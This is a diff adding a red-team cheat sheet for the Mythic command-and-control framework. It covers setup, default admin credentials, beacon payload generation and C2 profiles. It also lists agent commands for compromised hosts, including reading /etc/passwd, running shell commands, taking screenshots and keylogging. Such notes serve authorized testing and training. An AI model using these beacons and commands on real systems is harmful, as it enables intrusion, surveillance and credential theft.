@@ -1,0 +1,63 @@
+# ================= MythicC2 =================
+# Clone Mythic repository
+git clone https://github.com/its-a-feature/Mythic.git
+cd Mythic
+
+# Start Mythic using Docker
+sudo ./mythic-cli install_dependencies
+sudo ./mythic-cli start
+
+# Default Mythic UI: http://localhost:7443 (user: mythic_admin / pass: mythic_password)
+
+# ---------------- USER MANAGEMENT ----------------
+# Add new user
+sudo ./mythic-cli adduser --username <user> --password <pass>
+
+# Reset password
+sudo ./mythic-cli reset_password --username <user> --password <newpass>
+
+# ---------------- PAYLOAD GENERATION ----------------
+# List available payload types
+sudo ./mythic-cli payloadtypes list
+
+# Build a payload via CLI or web UI
+sudo ./mythic-cli payload create --payload-type apfell --c2-profile http --filename beacon
+
+# OR use the UI > "Payloads" tab > "Create Payload"
+
+# ---------------- OPERATION AND AGENT ----------------
+# Create a new operation
+Operations > New Operation > Name + Assign users
+
+# Wait for callback
+Agents > select agent to interact
+
+# Interact with agent
+type commands like:
+- shell whoami
+- download /etc/passwd
+- upload /tmp/file.txt
+- ps
+- screenshot
+- keylog_start / keylog_stop
+
+# ---------------- C2 PROFILES ----------------
+# View and configure profiles (e.g., HTTP/S, SMB, TCP)
+sudo ./mythic-cli c2profiles list
+
+# Customize or build your own C2 profile
+
+# ---------------- TASKING ----------------
+# Tasking queue visible in "Tasking" tab
+# Responses can be viewed under agent interaction or "Callbacks"
+
+# ---------------- LOGS & DEBUG ----------------
+# View docker logs
+docker logs mythic_c2
+
+# Rebuild payloads or services if modified
+sudo ./mythic-cli stop
+sudo ./mythic-cli start
+
+# ---------------- STOP MYTHIC ----------------
+sudo ./mythic-cli stop
